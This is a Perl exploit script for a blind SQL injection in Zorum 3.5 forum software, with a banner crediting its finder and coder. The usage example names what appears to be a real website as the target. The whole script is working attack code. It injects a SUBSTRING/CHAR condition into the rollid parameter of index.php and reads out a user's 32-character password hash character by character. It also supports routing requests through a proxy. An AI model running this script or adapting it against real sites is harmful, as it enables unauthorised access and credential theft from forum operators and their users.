#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
  print "                                                                     \n";
  print "   oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\n";
  print "   o   Zorum 3.5 Blind SQL Injection Exploit                        o\n";
  print "   o                                                                o\n";
  print "   o   Discovered By: CraCkEr                                       o\n";
  print "   o                                                                o\n";
  print "   o   Coded By: His0k4                                             o\n";
  print "   o                                                                o\n";
  print "   o   Greetz Go To : His0k4 , Hussin X                             o\n";
  print "   o                                                                o\n";
  print "   o   Usage: perl sploit.pl host /forum/ -r <id>                   o\n";
  print "   o                                                                o\n";
  print "   o   Example: perl sploit.pl japaneseanime-free.com /forums/ -r 1 o\n";
  print "   o                                                                o\n";
  print "   o   Options: -r valid roll id                                    o\n";
  print "   oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\n";
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $userid  = 1;
my $rid     = $ARGV[2];

my %options = ();
GetOptions(\%options, "u=i", "p=s", "r=i");

print "[~] Exploiting...\n";

if($options{"u"})
{
  $userid = $options{"u"};
}

if($options{"r"})
{
  $rid = $options{"r"};
}

syswrite(STDOUT, "[~] Hash: ", 14);

for(my $i = 1; $i <= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f && $h <= 57)
  {
    if(istrue2($host, $path, $userid, $rid, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f && $h <= 122)
    {
      if(istrue2($host, $path, $userid, $rid, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}

print "\n[~] Exploiting done\n";

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $uid   = shift;
  my $rid   = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua = LWP::UserAgent->new;
  my $query = "http://".$host.$path."index.php?method=showhtmllist&list=topic&rollid=".$rid." AND SUBSTRING(password,".$i.",1)=CHAR(".$h.")";
 
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
 
  my $resp = $ua->get($query);
  my $content = $resp->content;
  my $regexp ="listItemTitle";
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }

}

